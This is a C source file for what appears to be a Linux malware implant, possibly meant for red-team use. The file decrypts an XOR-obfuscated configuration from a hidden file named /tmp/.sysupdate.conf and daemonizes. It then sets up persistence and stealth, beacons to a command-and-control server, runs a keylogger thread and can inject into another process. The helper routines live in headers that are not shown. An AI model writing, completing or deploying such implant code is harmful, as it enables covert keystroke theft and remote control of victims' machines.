#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <dlfcn.h>
#include "headers/stealth.h"
#include "headers/injection.h"
#include "headers/keylogger.h"
#include "headers/c2_client.h"
#include "headers/persistence.h"

typedef struct {
    char c2_host[256];
    int c2_port;
    int injection_target;
    int persistence_type;
    int beacon_interval;
    char config_key[32];
} config_t;

config_t global_config;
volatile int keep_running = 1;

void signal_handler(int sig) {
    if (sig == SIGTERM || sig == SIGINT) {
        keep_running = 0;
    }
}

void decrypt_config(unsigned char *data, size_t len, const char *key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % strlen(key)];
    }
}

int load_config(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    
    unsigned char buffer[512];
    ssize_t bytes = read(fd, buffer, sizeof(buffer));
    close(fd);
    
    if (bytes <= 0) return 0;
    
    decrypt_config(buffer, bytes, "REDTEAM2026");
    
    char *ptr = (char*)buffer;
    strncpy(global_config.c2_host, ptr, sizeof(global_config.c2_host) - 1);
    ptr += strlen(ptr) + 1;
    global_config.c2_port = atoi(ptr);
    ptr += strlen(ptr) + 1;
    global_config.injection_target = atoi(ptr);
    ptr += strlen(ptr) + 1;
    global_config.persistence_type = atoi(ptr);
    ptr += strlen(ptr) + 1;
    global_config.beacon_interval = atoi(ptr);
    
    return 1;
}

void *beacon_thread(void *arg) {
    while (keep_running) {
        sleep(global_config.beacon_interval);
        
        if (global_config.c2_port > 0) {
            char beacon[64];
            snprintf(beacon, sizeof(beacon), "BEACON:%ld:%d", time(NULL), getpid());
            send_to_c2(beacon, strlen(beacon));
        }
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);
    signal(SIGPIPE, SIG_IGN);
    
    if (!load_config("/tmp/.sysupdate.conf")) {
        if (argc < 3) {
            fprintf(stderr, "Usage: %s <c2_host> <c2_port>\n", argv[0]);
            return 1;
        }
        strncpy(global_config.c2_host, argv[1], sizeof(global_config.c2_host) - 1);
        global_config.c2_port = atoi(argv[2]);
        global_config.injection_target = 0;
        global_config.persistence_type = 1;
        global_config.beacon_interval = 300;
    }
    
    if (daemonize()) {
        setup_persistence(global_config.persistence_type);
        setup_stealth();
        
        pthread_t beacon_tid, keylog_tid;
        pthread_create(&beacon_tid, NULL, beacon_thread, NULL);
        pthread_create(&keylog_tid, NULL, keylogger_thread, &global_config.c2_port);
        
        if (global_config.injection_target) {
            inject_into_process(global_config.injection_target);
        }
        
        while (keep_running) {
            sleep(1);
            
            if (!check_c2_alive()) {
                reconnect_c2();
            }
        }
        
        pthread_cancel(beacon_tid);
        pthread_cancel(keylog_tid);
        pthread_join(beacon_tid, NULL);
        pthread_join(keylog_tid, NULL);
        
        cleanup_persistence();
    }
    
    return 0;
}